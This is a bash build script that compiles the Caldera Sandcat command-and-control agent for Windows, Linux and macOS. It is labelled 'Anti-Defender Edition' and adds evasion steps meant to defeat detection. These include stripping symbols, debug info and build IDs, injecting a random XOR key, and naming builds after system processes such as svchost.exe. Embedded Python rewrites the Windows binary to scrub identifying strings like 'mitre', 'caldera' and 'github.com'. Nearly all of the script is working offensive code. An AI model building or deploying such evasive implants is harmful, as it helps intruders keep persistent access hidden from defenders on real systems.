#!/bin/bash
#
# Sandcat Stealth Compiler - Anti-Defender Edition
# Compiles Sandcat agent with advanced evasion techniques
#

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

PLUGIN_DIR="/home/morgana/caldera/plugins/sandcat"
GOCAT_DIR="$PLUGIN_DIR/gocat"
PAYLOAD_DIR="$PLUGIN_DIR/payloads"

echo -e "${CYAN}================================================================${NC}"
echo -e "${CYAN}    Sandcat Stealth Compiler - Anti-Defender Edition${NC}"
echo -e "${CYAN}================================================================${NC}"
echo ""

# Check dependencies
echo -e "${BLUE}[*]${NC} Checking dependencies..."

if ! command -v go &> /dev/null; then
    echo -e "${RED}[X]${NC} GoLang not installed!"
    exit 1
fi

GO_VERSION=$(go version | awk '{print $3}')
echo -e "${GREEN}[+]${NC} GoLang: $GO_VERSION"

# Generate random XOR key
RANDOM_KEY=$(openssl rand -hex 15 | cut -c1-30)
echo -e "${GREEN}[+]${NC} XOR key generated: ${RANDOM_KEY:0:10}..."

# Timestamp for beacon jitter
BUILD_TIME=$(date +%s)

cd "$GOCAT_DIR" || exit 1

echo ""
echo -e "${BLUE}[*]${NC} Preparing Go modules..."
go mod tidy > /dev/null 2>&1
echo -e "${GREEN}[+]${NC} Modules synchronized"

echo ""
echo -e "${CYAN}================================================================${NC}"
echo -e "${CYAN}  Compiling with Anti-Detection LDFLAGS${NC}"
echo -e "${CYAN}================================================================${NC}"
echo ""

# LDFLAGS anti-detection:
# -s : Strip symbol table (no function names)
# -w : Strip DWARF debug info
# -X : Set string variables at compile time
# -buildid= : Remove Go build ID
# -trimpath : Remove file system paths from binary

LDFLAGS="-s -w -buildid="
LDFLAGS="$LDFLAGS -X main.key=$RANDOM_KEY"
LDFLAGS="$LDFLAGS -X main.initialDelay=$BUILD_TIME"

# 1. Windows - svchost.exe
echo -e "${BLUE}[1/3]${NC} Compiling Windows (svchost.exe)..."
GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build \
    -trimpath \
    -ldflags="$LDFLAGS" \
    -o "$PAYLOAD_DIR/sandcat.go-windows" \
    sandcat.go

if [ $? -eq 0 ]; then
    SIZE=$(stat -c%s "$PAYLOAD_DIR/sandcat.go-windows" 2>/dev/null | numfmt --to=iec)
    echo -e "${GREEN}[+]${NC} Windows build complete ($SIZE)"
    
    # Apply GoHide obfuscation (removes "mitre", "caldera", "gocat" strings)
    echo -e "${BLUE}    [*]${NC} Applying GoHide obfuscation..."
    python3 - <<'EOFPYTHON'
import random
import string
import getpass

def get_random_replacement(old_string):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=len(old_string))).encode('utf-8')

# Read binary
with open('/home/morgana/caldera/plugins/sandcat/payloads/sandcat.go-windows', 'rb') as f:
    contents = f.read()

# Obfuscate IoC strings
id_extension = get_random_replacement('Go build ID: ')
contents = contents.replace(b'Go build ID: "', b'"%s' % id_extension)

# Suspicious paths
paths = ['mitre', 'caldera', 'sandcat', 'gocat', getpass.getuser()]
for path in paths:
    replace = get_random_replacement(path)
    contents = contents.replace(b'/%s/' % path.encode('utf-8'), b'/%s/' % replace)

# Incriminating strings
strings = ['github.com']
for old_string in strings:
    replace = get_random_replacement(old_string)
    contents = contents.replace(old_string.encode('utf-8'), replace)

# Write obfuscated binary
with open('/home/morgana/caldera/plugins/sandcat/payloads/sandcat.go-windows', 'wb') as f:
    f.write(contents)

print("    \033[0;32m[+]\033[0m GoHide applied: incriminating strings obfuscated")
EOFPYTHON
else
    echo -e "${RED}[X]${NC} Windows build failed!"
fi

# 2. Linux - systemd-networkd
echo -e "${BLUE}[2/3]${NC} Compiling Linux (systemd-networkd)..."
GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build \
    -trimpath \
    -ldflags="$LDFLAGS" \
    -o "$PAYLOAD_DIR/sandcat.go-linux" \
    sandcat.go

if [ $? -eq 0 ]; then
    SIZE=$(stat -c%s "$PAYLOAD_DIR/sandcat.go-linux" 2>/dev/null | numfmt --to=iec)
    echo -e "${GREEN}[+]${NC} Linux build complete ($SIZE)"
else
    echo -e "${RED}[X]${NC} Linux build failed!"
fi

# 3. Darwin/macOS - mdworker
echo -e "${BLUE}[3/3]${NC} Compiling macOS (mdworker)..."
GOOS=darwin GOARCH=amd64 CGO_ENABLED=0 go build \
    -trimpath \
    -ldflags="$LDFLAGS" \
    -o "$PAYLOAD_DIR/sandcat.go-darwin" \
    sandcat.go

if [ $? -eq 0 ]; then
    SIZE=$(stat -c%s "$PAYLOAD_DIR/sandcat.go-darwin" 2>/dev/null | numfmt --to=iec)
    echo -e "${GREEN}[+]${NC} macOS build complete ($SIZE)"
else
    echo -e "${RED}[X]${NC} macOS build failed!"
fi

echo ""
echo -e "${CYAN}================================================================${NC}"
echo -e "${GREEN}[+] Compilation completed successfully!${NC}"
echo -e "${CYAN}================================================================${NC}"
echo ""
echo -e "${YELLOW}[!] Anti-Detection Features Active:${NC}"
echo -e "   [+] Symbol table stripped (no function names)"
echo -e "   [+] Debug info removed (DWARF)"
echo -e "   [+] Build ID removed"
echo -e "   [+] Filesystem paths trimmed"
echo -e "   [+] XOR key runtime randomized"
echo -e "   [+] GoHide: 'mitre/caldera/gocat' strings obfuscated"
echo -e "   [+] Build timestamp masked"
echo ""
echo -e "${BLUE}[*]${NC} Payload directory: $PAYLOAD_DIR"
echo -e "${BLUE}[*]${NC} Restart Caldera to use new payloads"
echo ""
echo -e "${CYAN}================================================================${NC}"
